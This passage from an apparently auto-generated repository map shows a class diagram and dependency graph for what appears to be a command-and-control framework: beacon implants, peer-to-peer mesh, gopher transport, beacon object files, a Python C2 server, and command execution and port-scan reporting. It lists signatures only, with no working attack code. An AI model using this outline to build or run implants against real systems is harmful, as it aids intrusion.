    +execute_command(const bsb_config_t *cfg, const char *command)
    +main(void)
    +gethostname(hostname, sizeof(hostname) - 1);
    +cJSON_AddStringToObject(root, "output", output);
    +cJSON_AddNumberToObject(root, "pid", (double)getpid());
    +cJSON_AddNullToObject(root, "result_portscan");
    +cJSON_Delete(root);
    +free(ips);
    +RAND_bytes(iv_out, 16);
  }
  class beacon_c_mesh_msg_t {
    <<struct>>
    +report_result(const bsb_config_t *cfg,
                           const char *command...
    +execute_command(const bsb_config_t *cfg, const char *command)
    +main(void)
    +gethostname(hostname, sizeof(hostname) - 1);
    +cJSON_AddStringToObject(root, "output", output);
    +cJSON_AddNumberToObject(root, "pid", (double)getpid());
    +cJSON_AddNullToObject(root, "result_portscan");
    +cJSON_Delete(root);
    +free(ips);
    +RAND_bytes(iv_out, 16);
  }
  class beacon_api_h_datap {
    <<struct>>
    +go(char *args, int alen);
    +BeaconDataParse(datap *parser, char *buffer, int size);
    +BeaconDataPtr(datap *parser, int size);
    +BeaconDataInt(datap *parser);
    +BeaconDataShort(datap *parser);
    +BeaconDataLength(datap *parser);
    +BeaconDataExtract(datap *parser, int *size);
    +buffer(len may be 0 for strlen-style strings * but the buffer must still be NUL-terminated). */ void BeaconPrintf(int type, const char *fmt, ...);
    +BeaconOutput(int type, const char *data, int len);
  }
  class bof_c_linux_stat {
    <<struct>>
    +flush_output(void)
    +emit(const char *s)
    +format_mode(unsigned int mode, char *out)
    +path_reset(const char *root)
    +path_append(const char *name)
    +path_trim_to(int len)
    +walk(int depth)
    +go(char *args, int alen)
    +BeaconOutput(CALLBACK_OUTPUT, out_buf, out_pos);
    +syscall1(SYS_close, fd);
  }
  class bof_c_linux_dirent64 {
    <<struct>>
    +flush_output(void)
    +emit(const char *s)
    +format_mode(unsigned int mode, char *out)
    +path_reset(const char *root)
    +path_append(const char *name)
    +path_trim_to(int len)
    +walk(int depth)
    +go(char *args, int alen)
    +BeaconOutput(CALLBACK_OUTPUT, out_buf, out_pos);
    +syscall1(SYS_close, fd);
  }
  class server_py_C2State {
    <<class>>
    +load_runtime_config()
    +compute_hmac(key, data)
    +verify_hmac(key, data, signature)
    +encrypt_data(data, key, use_hmac)
    +decrypt_data(b64_data, key, use_hmac)
    +handle_get_command(state, selector)
    +handle_report(state, b64_payload)
    +handle_bof(state, name)
    +handle_request(state, selector)
    +serve_client(state, conn, addr)
  }
  class cJSON_c_internal_hooks {
    <<struct>>
    +CJSON_PUBLIC(const char *) cJSON_GetErrorPtr(void)
    +CJSON_PUBLIC(char *) cJSON_GetStringValue(const cJSON * const item)
    +CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item)
    +CJSON_PUBLIC(const char*) cJSON_Version(void)
    +case_insensitive_strcmp(const unsigned char *string1, const unsigned char *string2)
    +internal_malloc(size_t size)
    +internal_free(void *pointer)
    +internal_realloc(void *pointer, size_t size)
    +cJSON_strdup(const unsigned char* string, const internal_hooks * const hooks)
    +CJSON_PUBLIC(void) cJSON_InitHooks(cJSON_Hooks* hooks)
  }
  class cJSON_c_error {
    <<struct>>
    +CJSON_PUBLIC(const char *) cJSON_GetErrorPtr(void)
    +CJSON_PUBLIC(char *) cJSON_GetStringValue(const cJSON * const item)
    +CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item)
    +CJSON_PUBLIC(const char*) cJSON_Version(void)
    +case_insensitive_strcmp(const unsigned char *string1, const unsigned char *string2)
    +internal_malloc(size_t size)
    +internal_free(void *pointer)
    +internal_realloc(void *pointer, size_t size)
    +cJSON_strdup(const unsigned char* string, const internal_hooks * const hooks)
    +CJSON_PUBLIC(void) cJSON_InitHooks(cJSON_Hooks* hooks)
  }
  class cJSON_c_parse_buffer {
    <<struct>>
    +CJSON_PUBLIC(const char *) cJSON_GetErrorPtr(void)
    +CJSON_PUBLIC(char *) cJSON_GetStringValue(const cJSON * const item)
    +CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item)
    +CJSON_PUBLIC(const char*) cJSON_Version(void)
    +case_insensitive_strcmp(const unsigned char *string1, const unsigned char *string2)
    +internal_malloc(size_t size)
    +internal_free(void *pointer)
    +internal_realloc(void *pointer, size_t size)
    +cJSON_strdup(const unsigned char* string, const internal_hooks * const hooks)
    +CJSON_PUBLIC(void) cJSON_InitHooks(cJSON_Hooks* hooks)
  }
  class cJSON_c_printbuffer {
    <<struct>>
    +CJSON_PUBLIC(const char *) cJSON_GetErrorPtr(void)
    +CJSON_PUBLIC(char *) cJSON_GetStringValue(const cJSON * const item)
    +CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item)
    +CJSON_PUBLIC(const char*) cJSON_Version(void)
    +case_insensitive_strcmp(const unsigned char *string1, const unsigned char *string2)
    +internal_malloc(size_t size)
    +internal_free(void *pointer)
    +internal_realloc(void *pointer, size_t size)
    +cJSON_strdup(const unsigned char* string, const internal_hooks * const hooks)
    +CJSON_PUBLIC(void) cJSON_InitHooks(cJSON_Hooks* hooks)
  }
  class cJSON_h_cJSON {
    <<struct>>
    +void(CJSON_CDECL *free_fn)(void *ptr);
    +sensitive(1) or case insensitive (0) */ CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_bo
  }
  class cJSON_h_cJSON_Hooks {
    <<struct>>
    +void(CJSON_CDECL *free_fn)(void *ptr);
    +sensitive(1) or case insensitive (0) */ CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_bo
  }
  class gopher_beacon_c_MemoryStruct {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +gopher_request(const char* host, int port, const char* selector, const char* method, const ...
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class gopher_beacon_c_Trampoline {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +gopher_request(const char* host, int port, const char* selector, const char* method, const ...
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class gopher_beacon_c_SymbolResolver {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +gopher_request(const char* host, int port, const char* selector, const char* method, const ...
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class gopher_beacon_c_TrampolineCache {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +gopher_request(const char* host, int port, const char* selector, const char* method, const ...
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class aes_h_AES_ctx {
    <<struct>>
    +AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);
    +AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);
    +AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);
    +AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);
    +AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);
    +AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);
    +AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);
    +AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);
  }
  class beacon_h_datap {
    <<struct>>
    +BeaconDataParse(datap *parser, char *buffer, int size);
    +BeaconDataPtr(datap *parser, int size);
    +BeaconDataInt(datap *parser);
    +BeaconDataShort(datap *parser);
    +BeaconDataLength(datap *parser);
    +BeaconDataExtract(datap *parser, int *size);
    +BeaconPrintf(int type, const char *fmt, ...);
    +BeaconOutput(int type, const char *data, int len);
  }
  class beacon_common_c_MemoryStruct {
    <<struct>>
    +bsb_output_init(size_t capacity)
    +bsb_output_cleanup(void)
    +bsb_output_reset(void)
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void *target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void *target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +https_request(const bsb_config_t *cfg, const char *url,
                         ...
  }
  class beacon_common_h_http_response_t {
    <<struct>>
    +void(*bof_func_t)(char*, int);
    +bsb_output_init(size_t capacity);
    +bsb_output_cleanup(void);
    +bsb_output_reset(void);
    +BeaconPrintf(int type, const char *fmt, ...);
    +BeaconOutput(int type, const char *data, int len);
    +create_trampoline(void *target);
    +cleanup_trampolines(void);
    +get_or_create_trampoline(void *target);
    +https_request(const bsb_config_t *cfg, const char *url, const char *method, const char *post_data);
  }
  class beacon_common_h_Trampoline {
    <<struct>>
    +void(*bof_func_t)(char*, int);
    +bsb_output_init(size_t capacity);
    +bsb_output_cleanup(void);
    +bsb_output_reset(void);
    +BeaconPrintf(int type, const char *fmt, ...);
    +BeaconOutput(int type, const char *data, int len);
    +create_trampoline(void *target);
    +cleanup_trampolines(void);
    +get_or_create_trampoline(void *target);
    +https_request(const bsb_config_t *cfg, const char *url, const char *method, const char *post_data);
  }
  class beacon_common_h_SymbolResolver {
    <<struct>>
    +void(*bof_func_t)(char*, int);
    +bsb_output_init(size_t capacity);
    +bsb_output_cleanup(void);
    +bsb_output_reset(void);
    +BeaconPrintf(int type, const char *fmt, ...);
    +BeaconOutput(int type, const char *data, int len);
    +create_trampoline(void *target);
    +cleanup_trampolines(void);
    +get_or_create_trampoline(void *target);
    +https_request(const bsb_config_t *cfg, const char *url, const char *method, const char *post_data);
  }
  class beacon_common_h_TrampolineCache {
    <<struct>>
    +void(*bof_func_t)(char*, int);
    +bsb_output_init(size_t capacity);
    +bsb_output_cleanup(void);
    +bsb_output_reset(void);
    +BeaconPrintf(int type, const char *fmt, ...);
    +BeaconOutput(int type, const char *data, int len);
    +create_trampoline(void *target);
    +cleanup_trampolines(void);
    +get_or_create_trampoline(void *target);
    +https_request(const bsb_config_t *cfg, const char *url, const char *method, const char *post_data);
  }
  class beacon_common_h_bsb_backoff_t {
    <<struct>>
    +void(*bof_func_t)(char*, int);
    +bsb_output_init(size_t capacity);
    +bsb_output_cleanup(void);
    +bsb_output_reset(void);
    +BeaconPrintf(int type, const char *fmt, ...);
    +BeaconOutput(int type, const char *data, int len);
    +create_trampoline(void *target);
    +cleanup_trampolines(void);
    +get_or_create_trampoline(void *target);
    +https_request(const bsb_config_t *cfg, const char *url, const char *method, const char *post_data);
  }
  beacon3_c_MemoryStruct --> aes_h_AES_ctx : uses
  beacon3_c_MemoryStruct --> beacon_h_datap : uses
  beacon3_c_MemoryStruct --> cJSON_h_cJSON : uses
  beacon3_c_MemoryStruct --> cJSON_h_cJSON_Hooks : uses
  beacon3_c_SymbolResolver --> aes_h_AES_ctx : uses
  beacon3_c_SymbolResolver --> beacon_h_datap : uses
  beacon3_c_SymbolResolver --> cJSON_h_cJSON : uses
  beacon3_c_SymbolResolver --> cJSON_h_cJSON_Hooks : uses
  beacon3_c_Trampoline --> aes_h_AES_ctx : uses
  beacon3_c_Trampoline --> beacon_h_datap : uses
  beacon3_c_Trampoline --> cJSON_h_cJSON : uses
  beacon3_c_Trampoline --> cJSON_h_cJSON_Hooks : uses
  beacon3_c_TrampolineCache --> aes_h_AES_ctx : uses
  beacon3_c_TrampolineCache --> beacon_h_datap : uses
  beacon3_c_TrampolineCache --> cJSON_h_cJSON : uses
  beacon3_c_TrampolineCache --> cJSON_h_cJSON_Hooks : uses
  beacon5_c_MemoryStruct --> aes_h_AES_ctx : uses
  beacon5_c_MemoryStruct --> beacon_h_datap : uses
  beacon5_c_MemoryStruct --> cJSON_h_cJSON : uses
  beacon5_c_MemoryStruct --> cJSON_h_cJSON_Hooks : uses
  beacon5_c_SymbolResolver --> aes_h_AES_ctx : uses
  beacon5_c_SymbolResolver --> beacon_h_datap : uses
  beacon5_c_SymbolResolver --> cJSON_h_cJSON : uses
  beacon5_c_SymbolResolver --> cJSON_h_cJSON_Hooks : uses
  beacon5_c_Trampoline --> aes_h_AES_ctx : uses
  beacon5_c_Trampoline --> beacon_h_datap : uses
  beacon5_c_Trampoline --> cJSON_h_cJSON : uses
  beacon5_c_Trampoline --> cJSON_h_cJSON_Hooks : uses
  beacon5_c_TrampolineCache --> aes_h_AES_ctx : uses
  beacon5_c_TrampolineCache --> beacon_h_datap : uses
  beacon5_c_TrampolineCache --> cJSON_h_cJSON : uses
  beacon5_c_TrampolineCache --> cJSON_h_cJSON_Hooks : uses
  beacon5_c_mesh_msg_t --> aes_h_AES_ctx : uses
  beacon5_c_mesh_msg_t --> beacon_h_datap : uses
  beacon5_c_mesh_msg_t --> cJSON_h_cJSON : uses
  beacon5_c_mesh_msg_t --> cJSON_h_cJSON_Hooks : uses
  beacon5_c_peer_t --> aes_h_AES_ctx : uses
  beacon5_c_peer_t --> beacon_h_datap : uses
  beacon5_c_peer_t --> cJSON_h_cJSON : uses
  beacon5_c_peer_t --> cJSON_h_cJSON_Hooks : uses
  beacon6_c_MemoryStruct --> aes_h_AES_ctx : uses
  beacon6_c_MemoryStruct --> beacon_h_datap : uses
  beacon6_c_MemoryStruct --> cJSON_h_cJSON : uses
  beacon6_c_MemoryStruct --> cJSON_h_cJSON_Hooks : uses
  beacon6_c_SymbolResolver --> aes_h_AES_ctx : uses
  beacon6_c_SymbolResolver --> beacon_h_datap : uses
  beacon6_c_SymbolResolver --> cJSON_h_cJSON : uses
  beacon6_c_SymbolResolver --> cJSON_h_cJSON_Hooks : uses
  beacon6_c_Trampoline --> aes_h_AES_ctx : uses
  beacon6_c_Trampoline --> beacon_h_datap : uses
  beacon6_c_Trampoline --> cJSON_h_cJSON : uses
  beacon6_c_Trampoline --> cJSON_h_cJSON_Hooks : uses
  beacon6_c_TrampolineCache --> aes_h_AES_ctx : uses
  beacon6_c_TrampolineCache --> beacon_h_datap : uses
  beacon6_c_TrampolineCache --> cJSON_h_cJSON : uses
  beacon6_c_TrampolineCache --> cJSON_h_cJSON_Hooks : uses
  beacon_c_mesh_msg_t --> cJSON_h_cJSON : uses
  beacon_c_mesh_msg_t --> cJSON_h_cJSON_Hooks : uses
  beacon_c_peer_t --> cJSON_h_cJSON : uses
  beacon_c_peer_t --> cJSON_h_cJSON_Hooks : uses
  beacon_common_c_MemoryStruct --> aes_h_AES_ctx : uses
  beacon_common_c_MemoryStruct --> cJSON_h_cJSON : uses
  beacon_common_c_MemoryStruct --> cJSON_h_cJSON_Hooks : uses
  beacon_p2p_c_MemoryStruct --> aes_h_AES_ctx : uses
  beacon_p2p_c_MemoryStruct --> beacon_h_datap : uses
  beacon_p2p_c_MemoryStruct --> cJSON_h_cJSON : uses
  beacon_p2p_c_MemoryStruct --> cJSON_h_cJSON_Hooks : uses
  beacon_p2p_c_SymbolResolver --> aes_h_AES_ctx : uses
  beacon_p2p_c_SymbolResolver --> beacon_h_datap : uses
  beacon_p2p_c_SymbolResolver --> cJSON_h_cJSON : uses
  beacon_p2p_c_SymbolResolver --> cJSON_h_cJSON_Hooks : uses
  beacon_p2p_c_Trampoline --> aes_h_AES_ctx : uses
  beacon_p2p_c_Trampoline --> beacon_h_datap : uses
  beacon_p2p_c_Trampoline --> cJSON_h_cJSON : uses
  beacon_p2p_c_Trampoline --> cJSON_h_cJSON_Hooks : uses
  beacon_p2p_c_TrampolineCache --> aes_h_AES_ctx : uses
  beacon_p2p_c_TrampolineCache --> beacon_h_datap : uses
  beacon_p2p_c_TrampolineCache --> cJSON_h_cJSON : uses
  beacon_p2p_c_TrampolineCache --> cJSON_h_cJSON_Hooks : uses
  beacon_p2p_c_p2p_header_t --> aes_h_AES_ctx : uses
  beacon_p2p_c_p2p_header_t --> beacon_h_datap : uses
  beacon_p2p_c_p2p_header_t --> cJSON_h_cJSON : uses
  beacon_p2p_c_p2p_header_t --> cJSON_h_cJSON_Hooks : uses
  beacon_p2p_c_peer_t --> aes_h_AES_ctx : uses
  beacon_p2p_c_peer_t --> beacon_h_datap : uses
  beacon_p2p_c_peer_t --> cJSON_h_cJSON : uses
  beacon_p2p_c_peer_t --> cJSON_h_cJSON_Hooks : uses
  cJSON_c_error --> cJSON_h_cJSON : uses
  cJSON_c_error --> cJSON_h_cJSON_Hooks : uses
  cJSON_c_internal_hooks --> cJSON_h_cJSON : uses
  cJSON_c_internal_hooks --> cJSON_h_cJSON_Hooks : uses
  cJSON_c_parse_buffer --> cJSON_h_cJSON : uses
  cJSON_c_parse_buffer --> cJSON_h_cJSON_Hooks : uses
  cJSON_c_printbuffer --> cJSON_h_cJSON : uses
  cJSON_c_printbuffer --> cJSON_h_cJSON_Hooks : uses
  gopher_beacon_c_MemoryStruct --> aes_h_AES_ctx : uses
  gopher_beacon_c_MemoryStruct --> beacon_h_datap : uses
  gopher_beacon_c_MemoryStruct --> cJSON_h_cJSON : uses
  gopher_beacon_c_MemoryStruct --> cJSON_h_cJSON_Hooks : uses
  gopher_beacon_c_SymbolResolver --> aes_h_AES_ctx : uses
  gopher_beacon_c_SymbolResolver --> beacon_h_datap : uses
  gopher_beacon_c_SymbolResolver --> cJSON_h_cJSON : uses
  gopher_beacon_c_SymbolResolver --> cJSON_h_cJSON_Hooks : uses
  gopher_beacon_c_Trampoline --> aes_h_AES_ctx : uses
  gopher_beacon_c_Trampoline --> beacon_h_datap : uses
  gopher_beacon_c_Trampoline --> cJSON_h_cJSON : uses
  gopher_beacon_c_Trampoline --> cJSON_h_cJSON_Hooks : uses
  gopher_beacon_c_TrampolineCache --> aes_h_AES_ctx : uses
  gopher_beacon_c_TrampolineCache --> beacon_h_datap : uses
  gopher_beacon_c_TrampolineCache --> cJSON_h_cJSON : uses
  gopher_beacon_c_TrampolineCache --> cJSON_h_cJSON_Hooks : uses
```

---

## Code Property Graph

Machine-readable Code Property Graph (CPG) in JSON-LD format. This block allows AI agents to parse the full structural graph without additional file reads. Compatible with GraphRAG pipelines.

```json
{"@context": "https://schema.org", "analysis": {"communities": [{"cohesion": 0.892, "id": 0, "label": "root", "size": 19}, {"cohesion": 1.0, "id": 1, "label": "bof/include", "size": 7}, {"cohesion": 1.0, "id": 2, "label": "c2", "size": 3}, {"cohesion": 0.4, "id": 3, "label": "include", "size": 3}, {"cohesion": 1.0, "id": 4, "label": "include", "size": 2}, {"cohesion": 0.667, "id": 5, "label": "include", "size": 3}], "god_nodes": [{"node_id": "cJSON.h", "score": 27.8}, {"node_id": "aes.h", "score": 22.1}, {"node_id": "include/cJSON.c", "score": 18.0}, {"node_id": "cJSON.c", "score": 16.0}, {"node_id": "include/beacon_common.h", "score": 15.8}, {"node_id": "beacon_p2p.c", "score": 15.5}, {"node_id": "beacon5.c", "score": 15.4}, {"node_id": "beacon.h", "score": 15.3}, {"node_id": "include/beacon_common.c", "score": 15.1}, {"node_id": "bof/include/syscalls.h", "score": 13.9}], "surprising_connections": [{"hops": 7, "source": "bof.c", "target": "include/config.c"}, {"hops": 7, "source": "bof.c", "target": "tests/config_harness.c"}, {"hops": 6, "source": "beacon.h", "target": "include/config.c"}, {"hops": 6, "source": "beacon.h", "target": "tests/config_harness.c"}, {"hops": 6, "source": "bof.c", "target": "include/config.h"}]}, "edges": [{"confidence": "EXTRACTED", "relation": "imports", "source": "aes.c", "target": "aes.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "aes.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "aes.h", "target": "stdint.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "aes.h", "target": "stddef.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "app.py", "target": "os"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon.h", "target": "stdint.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon.h", "target": "stdarg.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "unistd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "time.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "sys/types.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "sys/socket.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "netinet/in.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "arpa/inet.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "net/if.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "sys/ioctl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "pwd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "errno.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "openssl/buffer.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "curl/curl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "openssl/rand.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "openssl/bio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "openssl/evp.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "sys/mman.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "elf.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "dlfcn.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "fcntl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "stdint.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "sys/wait.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "stdarg.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "netdb.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "beacon.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "aes.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon3.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "unistd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "time.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "sys/types.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "sys/socket.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "netinet/in.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "arpa/inet.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "net/if.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "sys/ioctl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "pwd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "errno.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "openssl/buffer.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "curl/curl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "openssl/rand.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "openssl/bio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "openssl/evp.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "sys/mman.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "elf.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "dlfcn.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "fcntl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "stdint.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "sys/wait.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "stdarg.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "netdb.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "pthread.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "sys/select.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "beacon.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "aes.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon5.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "unistd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "time.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "sys/types.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "sys/socket.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "netinet/in.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "arpa/inet.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "net/if.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "sys/ioctl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "pwd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "errno.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "openssl/buffer.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "curl/curl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "openssl/rand.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "openssl/bio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "openssl/evp.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "sys/mman.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "elf.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "dlfcn.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "fcntl.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "stdint.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "sys/wait.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "stdarg.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "netdb.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "poll.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "beacon.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "aes.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon6.c", "target": "cJSON.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "string.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "unistd.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "beacon_p2p.c", "target": "time.h"}, {"confidence": 